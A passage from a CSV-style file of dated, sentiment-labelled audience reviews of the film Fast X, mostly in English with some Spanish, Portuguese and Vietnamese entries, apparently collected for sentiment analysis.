Fast X is a mixed bag of a movie that will please die-hard fans of the franchise but disappoint others who expect more from a blockbuster finale. It is a fun and flashy spectacle that delivers on action and star power but lacks story and logic. It is not the best or the worst of the series, but somewhere in between."
"Jun 4, 2023",POSITIVE,It was worth watching to see all the well-know actors and actress of the FF franchise. Very interesting plot and the end was something phenominal. For sure there is FF 11 coming out sometime..
"Jun 4, 2023",NEUTRAL,"Great action movie. It has all the ingredients. The Fast and Furious story ended with Furious 7. Everything from F8 and onward have been good to great action movies but aren't related to the essence of what we loved about the movies. This one was very entertaining though, despite not be needed for, or related to, the core story."
"Jun 4, 2023",POSITIVE,FREAKIN AWESOME!!!!!!! Never a dull moment
"Jun 4, 2023",POSITIVE,The Fast franchise NEVER disappoints. It was an incredible roller-coaster ride. Jason Momoa definitely gave it a new angle. You'll know what I mean when you see it. What a great Saturday night. Just go see it. You'll be glad you did. Enjoy.
"Jun 4, 2023",NEGATIVE,It was mid. I admire the funny moments here and there but overall it’s very mid and could’ve been done better.
"Jun 4, 2023",NEUTRAL,Now I have seen everything
"Jun 4, 2023",POSITIVE,Time flew by. It keep your attention every minute.
"Jun 4, 2023",POSITIVE,Almost as good as part 1
"Jun 4, 2023",NEGATIVE,Fell asleep 2 or 3 times
"Jun 4, 2023",NEGATIVE,so bored and unrealistic movie
"Jun 4, 2023",POSITIVE,"Movie was actually really good and entertaining, look forward to the next!"
"Jun 4, 2023",NEGATIVE,Stairs. Stairs. Stairs. Stairs.
"Jun 4, 2023",NEGATIVE,Redo of a redo of a redo....and on and on! Make it stop!
"Jun 4, 2023",POSITIVE,Unbelievable!! That was one of the best fast and the furious movies in the franchise! Can't wait for the next one
"Jun 4, 2023",POSITIVE,Real good!! The ending piss me off  Now I have to wait til 2025 to see Aqua man die
"Jun 4, 2023",POSITIVE,"best one yet, gr8 action"
"Jun 4, 2023",POSITIVE,"I like the whole series and have watched every movie. I just hate seeing the unbelievable stunts. I laugh at all of the ridiculous stunts. They kind of went off the rails with effects after the second or third movies. I know its not real, but come on"
"Jun 4, 2023",NEGATIVE,The play role when out of the course.
"Jun 4, 2023",NEUTRAL,This is the one where Captain Marvel takes out Aqua Man
"Jun 4, 2023",POSITIVE,"Loved the movie. We have seen all of them, they are great."
"Jun 4, 2023",NEUTRAL,"Mamoa was wonderful throughout. The rest of the movie I just wondered when he'd be back.

Also, it's PART ONE, not a full movie. There is no rise and fall, terrible pacing, and a terrible cliffhanger of an ending."
"Jun 3, 2023",POSITIVE,Lots of action. Funny also.
"Jun 3, 2023",NEUTRAL,"While not an Infinity War-level game-changer, Fast X is a satisfying and entertaining enough pre-cursor to the franchise's inevitable end."
"Jun 3, 2023",POSITIVE,Over the top yet entertaining at the same time
"Jun 3, 2023",POSITIVE,I thought it was great movie with abundant action from beginning to end!
"Jun 3, 2023",POSITIVE,"I loved your app, very easy to use"
"Jun 3, 2023",POSITIVE,"It was a good movie, kept me on the edge of a seat to the end"
"Jun 3, 2023",POSITIVE,The show was absolutely awesome
"Jun 3, 2023",POSITIVE,"Fast paced, good story with an over the top, wacky expressive villain with cookie cutter over the top action sequences and explosions. You expect this in an action thriller. There were a few dull moments, but the story moved along quite nicely. Nothing you haven't seen before.

All the main characters from the previous movies were in play. All played their roles like troopers. Charlize Theron and Michelle Rodríguez got into a scuffle which was the only real fight scene in the whole movie. Hope to see more of Brie Larson kick some butt as Ms Nobody.

This cliff hanger set up the finale in the next installment. Don't know if they can stretch this into a 3 parter.

Overall I give it a 8.5/10. Not fantastic, but not bad either. Would certainly see it on IMAX!!"
"Jun 3, 2023",POSITIVE,I just can't wait til part 2 and 3..cuz I have more questions then answers..lol..but Momoa played his part extremely well...
"Jun 3, 2023",NEGATIVE,"Overall i liked the movie, plot was chaotic and it was intense almost all the way. But Jason's portay of the bad guy was so cringe. So many unnecessary scenes with him just trying to be comically and failing so hard. It just didn't fit the movie to have these completely different scenes where Jason was supose to be funny. Not gonna recommend it to anyone else and I'm not coming for the sequels."
"Jun 3, 2023",POSITIVE,Another awesome Fast movie.  Make sure to watch Fast 5 before this one.  It will help with the story line.
"Jun 3, 2023",POSITIVE,"I loved everything about it from old Clips to original people. It was pretty cool, I like it."
"Jun 3, 2023",POSITIVE,"It’s soo good, but the just can’t leave us like that 😭😭😭"
"Jun 3, 2023",POSITIVE,Leaves you hangin 🔥
"Jun 3, 2023",NEGATIVE,"Lots of action but, definitely the worst of the series.  IMO, disjointed, confusing, all over the place."
"Jun 3, 2023",POSITIVE,"I loved it!  And Im pretty sure they'll be a Fast 11 after seeing it too, which makes me even happier!  It was a little different than the others, but still had a lot of exciting action!  Great job!!"
"Jun 3, 2023",NEUTRAL,"Despite Jason Momoa's underwhelming performance, I enjoyed Fast X. His chemistry with Vin Diesel was lacking, and his inconsistent and chaotic acting stood out as one of the weakest in the series. However, the action, while not as insane as previous films, still had enough moments to entertain and amuse me. The movie strikes a balance between acknowledging its own absurdity without going into parody, which I appreciated.
Additionally, the practical effects used in the film were a welcome sight and added to the overall experience."
"Jun 3, 2023",POSITIVE,"Action, Love it.😆😂"
"Jun 3, 2023",NEUTRAL,The movie has good special effects. The script is poorly written. The screen writers are awful at Hollywood.  Hollywood movies are bad. I enjoyed watching the fast and furious movies when they came out . Please fix the movies. Get somebody who can write a screenplay.
"Jun 3, 2023",NEGATIVE,So bad it's like a parody.
"Jun 3, 2023",POSITIVE,Fun but so stupid. I do love these flicks.
"Jun 3, 2023",NEGATIVE,"Poco que decir, salvo que es más de lo mismo."
"Jun 3, 2023",NEUTRAL,"good ,but terrible ending"
"Jun 3, 2023",NEGATIVE,"Creo que hay un punto en que la acción se convierte en ridicules, y estas películas hace tiempo que lo alcanzaron. Sin contar el uso exagerado del CGI, la historia es una parodia de si misma intentando introducir plot twists cada vez mas ridículos, solo para intentar justificar su propia existencia..."
"Jun 3, 2023",POSITIVE,"it was captivating, intertaining. I'm looking forward to the sequel"
"Jun 3, 2023",POSITIVE,This was fun and definitely entertaining. In My top 3 out of all the these movies . 
"Jun 3, 2023",POSITIVE,"Tell the critics to f-off that's what they were doing. However utter nonsense that they are putting out to the big screen, it sure as HELL entertaining. In fact it's like a mix of Bollywood hyper-intensity with the star power comparable to the Avengers."
"Jun 3, 2023",NEGATIVE,"Jason Momoa was the single best thing about this movie. Vin Diesel could could barely keep his own eyes open for most of the movie. Simple script, big explosions and minimal clothing. Great for international audiences."
"Jun 3, 2023",NEUTRAL,"Jason Momoa stole the show. You could tell he was having fun with that role. The rest was as over the top as usual, with vehicles that laugh at the laws of physics. It was heavily action packed and you won't be bored. The perfect movie to shut your brain off with."
"Jun 3, 2023",NEUTRAL,"It was the same as the last several fast.... movies. Blowing up cars, planes, buildings and on and on it goes. They even leave a nice cliffhanger for episode 11. Come on really!!"
"Jun 3, 2023",NEUTRAL,"A.It's very digital. The scenes you could see that they were digitally enhanced.  B.Jason Mamoa's character reminded me of The Joker in Batman. Little quirky, the odd personality of evil. Well done by Mamoa. I do think he should had been listed higher up of actors. Regardless of a posted statement, I read, saying Mamoa ""overacted"", he played it like i believe it was scripted, like Jim Carrey also plays the quirky odd characters. C. There are many drama parts in this movie. You have to keep track of who and where the characters are going. D. There were emotional sections of remembrance. E. As a Grandma, I believe 8yr olds could see this with parents. No vulgarity or nudity was overwhelming.  F. Stay after the credits. There's the hint of whats next. 
G.  I strongly advise, before seeing, have an overload movie night/weekend of all the FF series, in order because this one includes them in some way and you might get lost. (B1- I'm just a little prejudice for Mr. Momoa as I'm a Norwalkian of Iowa. So, Ill buy the dvd for that reason.) Enjoy this flick and don't forget the popcorn before it starts."
"Jun 3, 2023",NEUTRAL,Bout time Dom got serious about protecting his family.  Only took 10 movies.
"Jun 3, 2023",POSITIVE,"Loved the craziness of Jason Manias character.  Disliked the character of Charlize Theron, cannot make a friend out of someone who killed your babys mother."
"Jun 3, 2023",NEGATIVE,I went to sleep a few times during the movie. It just didn't keep my attention.
"Jun 3, 2023",POSITIVE,"Loved Fast X. This movie was action-packed from the beginning to the end. There was so many twists and turns, that I didn't know what was going to happen next and to whom. It was a long one, but you were engaged and on the edge the entire time. Stay to the very end, there is more after the credits."
"Jun 3, 2023",NEUTRAL,"I think so is a big dumb, but, I love this franchise! watching this actors are part of my life on the cinema"
"Jun 3, 2023",POSITIVE,Plenty of action and suspense. There will be an XI
"Jun 3, 2023",NEGATIVE,"Vamos todos entrar em um consenso (incluindo você Vin Diesel) de que Velozes e Furiosos ACABOU. Não tem mais oque ser contado sobre essa família enjoativa. Essa franquia simplesmente irá encontrar pelo em ovo em seu décimo primeiro filme. Em seu décimo segundo, com toda certeza, Vin Diesel explorara o multiverso. São personagens que não morrem, como disse certa vez uma jovem sábia : Precisamos matar os personagens, como fazem em Game of Thrones. Sou brasileira e eu odeio como os filmes estrangeiros representam o Brasil, onde os atores e atrizes são mais espanhóis e mexicanos do que brasileiros."
"Jun 3, 2023",POSITIVE,nói chung phim cũng hay nhưng cái kết hơi hụt hẫn
"Jun 3, 2023",NEUTRAL,It's never ending... we are on number 10 and obviously there will be another the way they ended it with no closure.
"Jun 3, 2023",POSITIVE,a lot of wild car seens
"Jun 3, 2023",NEUTRAL,"eventhough it doesn't make any sense it was fun to watch, jason momoa was the best part"
"Jun 3, 2023",NEUTRAL,Too much killing and crashes that appeared fake as the Charger could never survive the crashes and still be drivable. Would not recommend.
"Jun 3, 2023",POSITIVE,AWESOME LOVED THE MOVIE
"Jun 3, 2023",POSITIVE,"phim hay, diễn xuất oke"
"Jun 3, 2023",NEGATIVE,There are two types of films that entertain me. Bad movies and good ones. This is one of the bad ones. The glimmer of hope with a classic car race was cut short to bring more pointless action scenes. So much love for Jason Mamoa but maniacal villain? That's not the guy.
"Jun 3, 2023",NEUTRAL,Movie jumps from too many places
"Jun 3, 2023",NEGATIVE,Story was all over the place. The ending was horrible and characters were only introduced for the hype this is definitely the worst movie yet and I was such a F&F fan
"Jun 3, 2023",POSITIVE,Put your brain in neutral and enjoy. Much more fun than the last few entries!
"Jun 3, 2023",NEGATIVE,"Same old, same old.
FAMILY!   
The only line he knows. 
Boring, overdone."
"Jun 3, 2023",NEGATIVE,Es una película obsesionada con el tema de la familia que le quita adrenalina y la convierte en una novela dramática.
"Jun 3, 2023",NEGATIVE,"Sucks !! I want my refund. 
They should have stopped this series I mean these movies when Paul died. I regret every dollar I paid for it. Never again. They are lost without My Paul."
"Jun 3, 2023",POSITIVE,"very cheesy as any fast and furious movie would be, the storyline is what keeps me hooked!"
"Jun 3, 2023",POSITIVE,"I loved this movie.  I AM A FAN OF JASON MAMOA, so I really enjoyed watching this movie!  I never get tired of all the action."
"Jun 3, 2023",POSITIVE,"It's better than the last few installments. It's clearly setting up for part two, so you have to take story build into consideration. Jason Momoa is in a league of his own with Dante. I'm glad we're getting a few movies with this character because watching Jason's villain makes you wonder where he's been this whole series. Momoa alone is worth seeing the movie. However, if you like fun in general, and have liked the past movies for the joy of them, it's worth the ticket admission too."
"Jun 3, 2023",POSITIVE,Great story as always. Jason Momoa is truly a badass villain in this one! It was a love and hate ending.... But looking forward to the next one!
"Jun 3, 2023",NEUTRAL,These are getting too far out there. I get the fast-paced and racing high-speed scenes. there were several that were completely unbelievable... I definitely liked the others better.
"Jun 3, 2023",NEGATIVE,Repeat of every other one
"Jun 3, 2023",POSITIVE,Can't wait till the final!!!!
"Jun 3, 2023",POSITIVE,Great movie. Non-stop action. Fantastic but if entertainment.
"Jun 3, 2023",POSITIVE,"Jason Momoa made this movie great!   He is such a treat to watch.  Is it over the top and ridiculous, yes!   But if you are a fan of the franchise, you will enjoy it!   Im hoping to see a Stinger racing in the next one!"
"Jun 3, 2023",NEUTRAL,good. action packed. family
"Jun 3, 2023",POSITIVE,Out of all the Furious movies I think this one is the best. It kept me on the end of my seat during the entire movie. But that ending though wasn't ready. Normally you get some closer at the end of the movie but not this time. Everything is left up in the air that you have to wait for the next movie in order for all your questions to be answered.  But one thing I loved was Jason Moana...he played his part to a T! Can't wait for the next installment
"Jun 3, 2023",POSITIVE,"nonstop action & the villain was perfect, but could've used a different actor cause Jason Momoa over acted the hell out of that movie."
"Jun 3, 2023",POSITIVE,"Money well spent.   To all the nerdy haters.   No, its not entirely realistic.   But sometimes you need that.  It's an escape.   The cast, explosions, fight scenes, etc are fun and entertaining.   If it's not your cup of tea.   Maybe you should go watch the cartoon spider verse or Little Mermaid.  Id watch it again.."
"Jun 3, 2023",POSITIVE,Good action...some heart wrenching moments.
"Jun 3, 2023",NEGATIVE,I left because the alarm went off in I didn’t watch the movie I got scared
"Jun 3, 2023",POSITIVE,Great movie. Didn’t feel like 2 1/2 hours.  The ending!!!!  OMG!!!!
"Jun 3, 2023",NEGATIVE,I didnt get to watch the movie because I brought tickets to the wrong theater in different city and I couldnt get an exchange or refund to the correct city and theater.
"Jun 3, 2023",POSITIVE,Everything !! its a great movie
"Jun 3, 2023",POSITIVE,Review:  https://wp.me/p65txm-dSz
"Jun 3, 2023",POSITIVE,I absolutely loved all the characters that were mentioned! The story line was exciting and I am waiting for the next movie!
"Jun 2, 2023",POSITIVE,I loved it! I felt it was as satisfying as the others! So glad I went to see it. Loved it!
"Jun 2, 2023",POSITIVE,"It was really action packed, and it kept my attention throughout."
"Jun 2, 2023",POSITIVE,Kept us on the edge of our seats in suspension!!!! Can't wait for the sequel!!!!!!
"Jun 2, 2023",NEUTRAL,"lots of action, would like it to go back to being about cars and racing."
"Jun 2, 2023",POSITIVE,SO GOOD!!!!! Can't wait for the next one👍💕
"Jun 2, 2023",POSITIVE,Action packed! Excellent movie..
"Jun 2, 2023",NEGATIVE,"This one was the worst. This Franchise so desperately needs a mercy-kill. The Fast franchise we all knew and loved no longer bares a soul and what we get now is a money grabbing machine. The second-hand embarrassment is palpable scene after scene. Littered with terrible one liners that make cheesy 80s movies look Oscar worthy, the best only relief you get are thanks to Jason Momoa and nothing else."
"Jun 2, 2023",POSITIVE,Captivating and hilarious. It has everything that made you first love the franchise and more. Someone has been paid a lot of money to bad mouth this movie. Dominic Toretto does not have superpowers. He simply has a moment where out of adrenaline he lifts a car that lives itself as soon as it is rocked forward a little bit. Would see you again and again and again.
"Jun 2, 2023",NEGATIVE,"didn't like how the movie end, and the role Jason played"
"Jun 2, 2023",POSITIVE,"Aside from the abrupt ending, and Jakob dying, which Is weird a bit, This was a very fun movie. And the Rock's return is huge too. Hopefully he and Cena get screen time together in the next one, because this saga is not over."
"Jun 2, 2023",POSITIVE,Amazing as always! & I CAN'T WAIT FOR THE NEXT ONE!
"Jun 2, 2023",POSITIVE,Loved it! The movie was action packed from beginning to end. The cameos were awesome. Just wish they didn't leave us hanging at the end
"Jun 2, 2023",POSITIVE,It's a  got to watch just to see who comes back
"Jun 2, 2023",POSITIVE,Loved the continuous action and twists and turns in the story!
"Jun 2, 2023",NEGATIVE,"Predeciblemente fast X es una entrega llena de acción ridícula ,con tramas secundarias tan simples que no sorprenden ,desde algún punto esta saga solo se  volvió una monótona historia que solo puede entregar acción y explosión ,lo mas destacable tal vez sea el villano que con una vibra de maniática logra mantener el filme en un punto aceptable por lo menos fast X mejoro con respecto a su nefasta antecesora."
"Jun 2, 2023",NEGATIVE,Who tf keeps watching these movies
"Jun 2, 2023",POSITIVE,Great action scenes and funny new villain. That’s about it. Same old same old
"Jun 2, 2023",NEGATIVE,"Oh lord , my main question is why ?"
"Jun 2, 2023",POSITIVE,"Fast X is a high-octane, globe-trotting spectacle filled with thrilling action sequences. Director Louis Leterrier maximizes the film's budget, delivering jaw-dropping moments like a bomb bouncing through the streets of Rome and a gigantic vault being dragged through Rio. While not as outlandish as Fast 9, the film's intense plot reunites Dominic Toretto with an unhinged antagonist, played energetically by Jason Momoa. Despite the recurring cast showing signs of fatigue, Momoa injects the sequel with a refreshing burst of energy."
"Jun 2, 2023",POSITIVE,Fabulous.  have gone to see it 3 times!!
"Jun 2, 2023",POSITIVE,I love this movie but hate how it ended. Fast 7 will always be my favorite.
"Jun 2, 2023",NEUTRAL,Some guy snuck in and kept watching us
"Jun 2, 2023",NEGATIVE,This movie franchise is now for milking in at this point. Let’s just stop going to see these movies so they’ll stop.
"Jun 2, 2023",NEGATIVE,"Went pretty much knowing what to expect. Even with that being true, I left after 1/2 an hour. But ok for those that like constant car chases, bad guys killing each other ( they all seemed like bad guys to me), etc etc"
"Jun 2, 2023",NEUTRAL,"Too many unbelievable action scenes and the new ""bad guy"" was too creepy and flamboyant for me. I also didn't care for the choice of who lives and who dies at the end. I am a big fan of the Fast series, especially with Paul Walker, but this final episode left me disappointed."
"Jun 2, 2023",NEUTRAL,"You can't expect a super excellent script out of a f&f saga but, what Jason momia does to his character it's just amazing, it's kinda controversial say that this movie it's bad and then say that the villain is amazing. Because all the story it's around him. So yea, all that thing about family and faith bla bla bla, but just put that on side and enjoy the movie 😮‍💨"
"Jun 2, 2023",POSITIVE,"We're close to the end, but it can't end without having us on the edge of our seats like the other The Fast And The Furious films have done. This one is different compared to the Fast 9. Brings a whole new story that makes a bad guy like Dante the psychotic winner. I can't wait til Fast 11. This is it. Fast X is another big one with full speed ahead on display."
"Jun 2, 2023",NEGATIVE,"Unironically silly and cartoonish, cheesy dialogues and yet the worst scene was being able to reverse the anesthesia gas back into the vents to make them baddies pass out. Why did such a bypass exist? Why am I watching this?"
"Jun 2, 2023",NEGATIVE,"It's not good. Too frequently it tries to be serious making it unfun. 

When Vin Diesel is on screen its a bad time, but the supporting cast (especially Cena and Mamoa) make it worth a shot for those familiar with the franchise."
"Jun 2, 2023",NEGATIVE,I can say it was better than fast 9 but not by much. At least they didn't go to space this time.
"Jun 2, 2023",NEGATIVE,"Le pongo 2 estrellas porque tiene muy buenas efectos pero cero historia , hay partes muy exageradas surrealistas (flasheras)"
"Jun 2, 2023",NEUTRAL,"Fun movie, the ending was disappointing but I will continue to see the series."
"Jun 2, 2023",NEUTRAL,"Well….  It was better than F9 !  Iv always been a defender of this crazy series. But F9 didn't just jump The MEG. It jumped the planet !  So going into this one I had no expectations. , Just grabbed my snacks and treat it like it is .. a popcorn movie. Check your brain at the door and have fun with it , kind of like Sharknado with cars .  Jason Momoa was a crazy joker-esk blast , He completely made the movie.  So go in sit back and watch the tornado hit the trailer park."
"Jun 2, 2023",NEUTRAL,"The family dynamic is what I like most. Of course the action is exciting. Its pretty far fetched, more so than other Furious movies."
"Jun 2, 2023",POSITIVE,This would be a movie that is just dumb fun. You can easily sit back and enjoy the action.
"Jun 2, 2023",NEUTRAL,"Unrealistic stunts defying the laws of physics, corny comedic segments and Vin Diesel says ‘family' more times than I've had hot dinners but this is what Fast & Furious has evolved into, and I love it."
"Jun 2, 2023",POSITIVE,Amazing action throughout the movie ! I was hooked for the whole duration of the movie ! Definitely want to watch it again !!
"Jun 2, 2023",NEUTRAL,Movie had a lot of different locations in the movie.  A little hard to follow.
"Jun 2, 2023",NEGATIVE,"I read Vin Diesel blames Jason Mamoa's over acting for negative reviews, Mamoa is what got me to the cinema to watch it in the first place and found his performance the best part of the film, the rest of the cast were mainly boring, except maybe Cena, Diesel was the worst."
"Jun 2, 2023",POSITIVE,DID NOT SEE THAT COMING! Absolutely hilarious and catch worthy! Can’t wait for the next one!
"Jun 2, 2023",NEGATIVE,"For a large budget movie cgi was terrible, it was supposed to end with 10 movies because that’s what was promised with Paul Walker, making this a trilogy is just milking it at this point"
"Jun 2, 2023",POSITIVE,It was an awesome movie!! Lots of unexpected but that is what makes the movie!!! Loved it!!!
"Jun 2, 2023",POSITIVE,"This is one of the better movies in the Fast and Furious franchise. The movie looks like money too! The locations, the cars- oh and the overall style! The stylist for the actors need an Oscar nod. The storyline is perfectly set up too. Definitely a must see!"
"Jun 2, 2023",NEGATIVE,"Muy mala no tena ni pies ni cabeza, se les acabaron las ideas"
"Jun 2, 2023",NEUTRAL,"Fun, entertaining, action packed, doesnt take itself too seriously."
"Jun 2, 2023",POSITIVE,WHAT A FANTASTIC ACTION PACKED MOVIE FROM START TOO FINISH CANNOT WAIT FOR THE SEQUEL TOO COME OUT IN 2025
"Jun 2, 2023",NEUTRAL,"Décimo filme da série apresenta o tema famíia, O vilão bem excêntrico e um roteiro pouco criativo, exceto pelas cenas para lá de impossíveis. Cansa e o final não finaliza, mas vale a pena para os fãs como mas alguns confusã tem"
"Jun 2, 2023",NEUTRAL,"I liked it, but just get a little bit too far fetch like they're turning into superheroes movie instead of sticking with the main storyline of street racers"
"Jun 2, 2023",NEUTRAL,"Better than Fast 9 but not great.  As will all these movies, you have to suspend disbelief.  The Vatican opener was well done action sequence.  Jason Momoa was fun villain if you like over-the-top silly mixed with menace.  Don't love the cliffhanger element."
"Jun 2, 2023",POSITIVE,I liked the action and how Jason Momoa did his role.
"Jun 2, 2023",NEGATIVE,disliked that i couldn’t make an exchange of my tickets 30 min before showtime because of not being to come to my original time due to family emergency.
"Jun 2, 2023",NEGATIVE,"An atrocious, over-the-top, melodramatic, & loaded action flick that doesn’t know when to press the brakes. Entertaining? Yes, but left no room to breathe from camera shots. The lack of reality makes this unbearable to attach any emotions. I had to pull out the alcohol."
"Jun 2, 2023",NEGATIVE,I gave this franchise one more chance and I wasted 2+ hours of my life. So sad for it to go out like this. 
"Jun 2, 2023",NEGATIVE,The action was great. The one arm car lift c'mon be real. The acting from Jason Momoa was all over the place. What was he trying to get across with it. It was like a weird flamboyant joker from Batman in the 50s. I expected better acting from such a professional actor. The rest of the movie was ok. The ending killed the series for me. Leave it at fast 9. Not worth it. There was some cool scenes with the rest of the crew but not enough to watch the whole movie for. Thanks for ruining my favorite movie series Momoa! I now dislike you in everything you will do I will not support you anymore.
"Jun 2, 2023",POSITIVE,"Es verdad que tiene escenas muy ficticias, pero de resto es una muy buen pelicula, una historia bien contada y entretenida."
"Jun 2, 2023",NEGATIVE,Getting tired of this franchise.
"Jun 2, 2023",POSITIVE,I love this franchise. We are always and forever family. Family is the best .
"Jun 2, 2023",NEGATIVE,The plot didn't make any sense the ending was pretty horrible I only liked the sound track
"Jun 2, 2023",NEUTRAL,"La verdad la película sirve para pasarla bien , desconectarte del mundo quitarle los detalles de lo real y lo imposible al momento de las escenas de acción , Jason momoa refresca ese aire de villano que no puedes odiarlo , simplemente te cae a medida que aparece"
"Jun 2, 2023",NEUTRAL,"Jason Momoa saved for me the film. Amazin work from him, but to end it on a cliffhanger was a disappointment for me. SGI was 5/10, story was 5/10, acting was again 5/10 except Jason Momoa. Hope the next part will be better an if not the series needs to end."
"Jun 2, 2023",NEUTRAL,"la pelicula es buena, la recomiendo, tiene algunos errores pero la peli esta bien."
"Jun 2, 2023",NEGATIVE,"This new movie is the same others, but it had bad animation so."
"Jun 2, 2023",NEGATIVE,"Stop it already, this has been too much so far....."
"Jun 2, 2023",NEUTRAL,Go in with low standards and fond remembrance of the cheesiness that is the Fast franchise and this movie is quite enjoyable. I watched it Thursday opening with a packed house that reacted great and added to the experience.
"Jun 2, 2023",POSITIVE,This movie was a 10 plus 10 I liked all the stars that were in it and the adrenaline rushing action we'll see it again
"Jun 1, 2023",NEUTRAL,"Lots of car action like you've come to expect and decent humor, but I'm starting to feel like the story has gone on for too long now. Jason Momoa looked like he was having fun with his role, and there were other additions to the cast that I liked. The ending is enough for me to come back for the next one."
"Jun 1, 2023",POSITIVE,"I liked it. Not Woohoo great, but I liked it."
"Jun 1, 2023",NEGATIVE,Horrible ending makes no sense. The bomb literally destroys Teretos car some way some how it stops the bomb.
"Jun 1, 2023",POSITIVE,Was a great movie but felt like I paid for a half a movie
"Jun 1, 2023",POSITIVE,Jason mamoa is great in this.
"Jun 1, 2023",NEGATIVE,"This movie is the worst one ever , not worth watching. Avoid"
"Jun 1, 2023",NEGATIVE,"Una de las películas más aburridas definitivamente Vin Disel ya no debería de hacer esto está muy aburrido y predecible su papel lo único bueno fue Momoa y el final que dejó La Roca, bueno hasta la actuación de Jonh Cena fue de lo mejor ojalá que en la próxima película ya muera el pelón definitivamente..."
"Jun 1, 2023",POSITIVE,Unbelievable action awesome driving and just a good story line and stay for a while after the movie is over you won't believe what is coming next.  It is a surprise and i never thought what is coming next will be unbelievable
"Jun 1, 2023",NEGATIVE,"Although there are fun sequences to relish, the threat of danger for any of the characters are now virtually non-existent; and as the world of this franchise expands, the plot grows into a cacophony of disarray."
"Jun 1, 2023",NEUTRAL,The movie was so unrealistic. The only thing that kept me watching was Jason Momoas' character.
"Jun 1, 2023",POSITIVE,Love it can't wait to see where it take us next
"Jun 1, 2023",POSITIVE,Great movie paul walker would’ve been proud a must see if you like action need more races but will keep you entertained 
"Jun 1, 2023",POSITIVE,"Me encantó, Jason Momoa es expectacular, y tiene todo lo q siempre nos tiene acostumbrado esta Saga"
"Jun 1, 2023",NEUTRAL,"Fun to watch if you are a family member, if not, it is another Fast and Non sense Furious movie, Just to pass the time"
"Jun 1, 2023",NEGATIVE,Jason Momoa ruined it
"Jun 1, 2023",NEGATIVE,"Momoa looks like he's having fun, but I only wish I did. Overall mediocre with bad CGI and story, but at least not boring. This franchise needs to end..."
"Jun 1, 2023",POSITIVE,"A bit over the top but highly entertaining!  A breath of fresh air from the politically slanted studio offerings from the likes of Disney, et al. Fast X is a pure action movie with a surprisingly clever performance by newcomer Jason Momoa."
"Jun 1, 2023",POSITIVE,The surprises! The geographical content! The end. Nail biting and two thumbs up. This is definitely a must see.
"Jun 1, 2023",POSITIVE,Stupid and entertaining! That's is the best way to describe the latest movie of a series that should have ended a long time ago. It's way better than Fast 9. I really liked Momoa in the movie. It really looked like he had a lot of fun.
"Jun 1, 2023",NEGATIVE,"Felt like I was watching a video game, way to much CGI action."
"Jun 1, 2023",NEGATIVE,"I'm a long-time fan of the FF movies, but this was a really long, drawn-out movie with poor CGI and half-baked acting, and it didn't feature any cool cars to balance the movie. I do not often want to give up on a movie, but this had me side-eyeing the exit door a few times. Had it not been for the horrifically priced nachos combo at Odeon I bought x2, I would have bailed.

FF7 was the pinnacle of the franchise and drift towards irrelevance is approaching quickly. More cars and fewer MI-style plots, please. Jason Mamoa was funny but the camp-jack-sparrow-butterfly-act didn't suit the level of malice he inflicted throughout the movie."
"Jun 1, 2023",NEUTRAL,"I'm not sure it's good enough that I would recommend it but at this point you should know pretty well if the ""Fast"" franchise is for you or not. Jason Momoa provides a refreshing take on the villain role in flamboyant fashion and he's having a blast doing it which adds appeal. It's a continuation of one of the most outrageous movie franchises in cinematic history and regardless what you think you have to give it credit to how it started and where it is now. I can't think of any other franchise that created so much out of so little.

""Never accept death when suffering is owed"""
"Jun 1, 2023",POSITIVE,Velozes e Furiosos é o filme mais mentiroso que conheço.... mas a realidade tá tão ruim que eu curto demais a mentirada! hahahaha
"Jun 1, 2023",POSITIVE,That was Fun. but it's bunch of actors so hard to fit a script. if was not a fan of the movie before it's hard to understand. I watched all fast series It's okay for me. This is the second best movies than fast five. I knew why have three parts. a lot to tell. a lot of drama. a lot of actors. give it a time. well It's a great movie. 👍 Oh Dunte take over the scene! He's very attractive. So charming my aquaman haha
"Jun 1, 2023",POSITIVE,I do not like this movies... but I gotta say it was pretty entertaining
"Jun 1, 2023",NEUTRAL,"Saw this today.  Started a bit slow.  Ended up being an okay time watching.  What is up with Dom""s son?  Mother or father is not black?  Was he switched at sometime?  Getting a bit ridiculous with the dead persons coming back.  Will watch the last one to see it out."
"Jun 1, 2023",POSITIVE,"Spoilers: 

I hate the fast and and furious films, but this one was a treat. The movie feels completely self aware and acts almost like a parody of itself. It's just incredible, I don't think I've enjoyed watching a film this much in a long time. Jason Mamoa absolutely steals the show, and I honestly don't think I could have recommended this movie if it weren't for him. This film is entirely incompetent which is what makes it so great. The movie ends on a cliffhanger and supposedly kills off half of the cast in the most hilarious and underwhelming ways imaginable.

Chefs kiss
Solid 10/10"
"Jun 1, 2023",POSITIVE,Need another one with Hobbs and Vin Diesel if he still alive
"Jun 1, 2023",POSITIVE,Cliffhanger?! Seriously?!
"Jun 1, 2023",POSITIVE,It was pretty good now I’m sad. I have to wait for the second part. When is it gonna come out?
"Jun 1, 2023",NEGATIVE,Movie was ok. Would’ve waited till it hit Netflix. Aquaman just literally sucked. Remove him. The ending also sucked
"Jun 1, 2023",POSITIVE,movie plot was not that good but Jason Mmoa made the movie he never swears yet still makes the movie worth it to watch but the ending is a cliff hanger
"Jun 1, 2023",NEUTRAL,"The whole movie was okay, but the thing that a hated the most was the cliffhanger and the end. I hope fast 11 comes soon, I do not want to see another cliffhanger"
"Jun 1, 2023",NEGATIVE,The whole movie was not what I expected
"Jun 1, 2023",NEGATIVE,"Came with my 11 years old son, the first 20 min i was able to deal with the CGI and the after the Aquaman start acting like weird and weird and weird that has nothing to do with the story or racing cars. And then he keep showing with blouse and ladies sunglasses and 2 pony tails and painting nails , i had to take my son out this none sense!  Waste of money n time with my son,  will not recommend it ..."
"Jun 1, 2023",POSITIVE,Esta película esta con madres!!
"Jun 1, 2023",POSITIVE,This movie keep getting better and better. Great movie
"Jun 1, 2023",NEUTRAL,"Fast X / Rapidos y furiosos es compricada
la nueva pelicula de Mas rapidos y furiosos siendo la 10/X.
Esta saga de peliculas comenzo en 2001 y creo que terminara en 2024_2025 parese ya no tener un guion ni una trama tan emocionante como las antetioles
Vin Diesel en esta pelicula tiene un desarrollo bueno.... pero ya con mas de 10 peliculas y dos mas 2 que creo que tambien sera el prota.
El actor es un chiste vidiente con tantas peliculas de/rapidos y mucho mas."
"Jun 1, 2023",POSITIVE,"Really good movie!  Jason Momoa is one of the best bad guys ever.  There should be a spin off series of just his character.  I would watch 10 movies of that, too!"
"Jun 1, 2023",POSITIVE,Surprisingly entertaining
"Jun 1, 2023",POSITIVE,I don’t like the ending because now I’m wandering what’s going to happen. But overall I love the movie.
